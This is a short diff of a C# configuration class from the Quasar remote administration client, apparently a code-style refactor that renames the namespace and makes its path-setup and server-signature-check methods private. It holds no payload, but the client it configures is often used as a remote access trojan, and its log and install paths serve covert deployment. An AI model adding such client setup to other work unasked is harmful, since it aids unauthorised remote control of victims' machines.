@@ -1,13 +1,10 @@
-﻿using Quasar.Common.Cryptography;
+﻿using Quasar.Common;
 using System;
 using System.IO;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
-using System.Windows.Forms;
-using Newtonsoft.Json;
-using Quasar.Common;
-namespace Quasar.Client.Config
+namespace Quasar.Client
 {
     /// <summary>
     /// Stores the configuration of the client.
@@ -49,20 +46,20 @@ namespace Quasar.Client.Config
             return VerifyHash();
         }
 
-        static void SetupPaths()
+        private static void SetupPaths()
         {
             LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
             INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
         }
 
-        static bool VerifyHash()
+        private static bool VerifyHash()
         {
             try
             {
-                var rsa= SERVERCERTIFICATE.GetRSAPublicKey();
+                var rsa = SERVERCERTIFICATE.GetRSAPublicKey();
                 return rsa.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(_options.EncryptionKey)), Convert.FromBase64String(_options.ServerSignature),
-                    HashAlgorithmName.SHA256,RSASignaturePadding.Pkcs1);
-                
+                    HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
+
             }
             catch (Exception)
             {
